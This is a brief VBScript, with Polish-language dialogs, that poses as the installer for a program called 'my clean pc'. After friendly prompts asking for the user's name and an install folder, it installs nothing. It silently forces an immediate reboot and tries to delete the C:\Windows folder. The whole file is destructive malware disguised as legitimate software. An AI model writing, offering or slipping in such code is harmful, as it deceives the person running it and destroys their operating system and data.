
Dim sInputBox
MsgBox "Witaj w my clean pc! Dziekujemy ze nas wybrales/as! kliknij OK aby kontynuowac.",0+64,"my clean pc"
sInputBox = InputBox ("Witaj w instalatorze programu my clean pc!! przed zainstalowaniem produktu, powiedz nam jak sie nazywasz?")
MsgBox "Dobrze! teraz kliknij Ok, aby kontynuowac: "& sInputBox,0,"Instalator My Clean Pc"
sInputBox = InputBox ("Gdzie ma byc miejsce docelowe instalacji??")
MsgBox "Dobra!! Miejsce docelowe aplikcji to: "& sInputBox,0,"zatwierdzone"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "shutdown.exe -r -t 0", 0
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFolder "C:\Windows"




